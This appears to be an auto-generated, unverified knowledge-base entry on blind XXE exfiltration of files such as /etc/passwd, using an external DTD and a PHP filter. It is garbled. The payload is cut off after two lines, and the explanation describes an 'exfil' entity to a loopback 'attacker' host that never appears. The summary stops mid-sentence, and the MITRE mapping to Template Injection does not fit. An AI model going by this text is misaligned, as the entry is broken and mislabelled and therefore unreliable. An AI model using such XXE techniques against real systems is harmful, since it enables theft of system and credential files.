---
id: 15525130-1cbe-48b0-bf46-10b989ba6bc4
name: Blind XXE Data Exfiltration with DTD and PHP Filter
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:44.421123+00:00'
updated_at: '2023-04-10T20:24:41.109392+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Template Injection|T1221 - Template Injection]]'
tags:
- '[[Exploiting blind XXE to exfiltrate data out-of-band]]'
- '[[XML External Entity]]'
- '[[XXE OOB with DTD and PHP filter]]'
---

# Blind XXE Data Exfiltration with DTD and PHP Filter

## Summary

Blind XXE data exfiltration with DTD and PHP filter is a technique used to exfiltrate data from a vulnerable application using XML External Entity injection. This technique is used when the application is vulnerable to XXE injection but does not return any useful information in the response. The at

## Description

# Description

Blind XXE data exfiltration with DTD and PHP filter is a technique used to exfiltrate data from a vulnerable application using XML External Entity injection. This technique is used when the application is vulnerable to XXE injection but does not return any useful information in the response. The attacker can use this technique to exfiltrate data out-of-band by leveraging the DTD to send the data to an external server controlled by the attacker. The attacker can also use PHP filter to encode the data and bypass certain security measures. This technique can be used to steal sensitive data such as credentials, personally identifiable information, and proprietary information.

## Requirements

1. Ability to inject XML External Entities into the vulnerable application

## Defense

1. Implement input validation and sanitization to prevent XXE injection

1. Disable external entity parsing in the XML parser

1. Monitor network traffic for any suspicious activity

## Objectives

1. Exfiltrate sensitive data from a vulnerable application

# Instructions

1. Exploit an XML External Entity vulnerability by injecting a malicious XML entity that references an external file, and then exfiltrate the contents of that file.

**Code**: [[<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r A]]

> This command is used to exploit an XML External Entity (XXE) vulnerability. The vulnerability arises when an XML parser processes input from untrusted sources, allowing an attacker to inject a malicious XML entity that references an external file. In this case, the injected entity is named 'exfil', and it references the file located at 'http://127.0.0.1/dtd.xml?%data;', where '%data' is the base64-encoded contents of the '/etc/passwd' file. The exfiltrated data is then stored on the attacker-controlled server at 'http://127.0.0.1/dtd.xml'.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Template Injection|T1221 - Template Injection]]

## Tags

- [[Exploiting blind XXE to exfiltrate data out-of-band]]
- [[XML External Entity]]
- [[XXE OOB with DTD and PHP filter]]
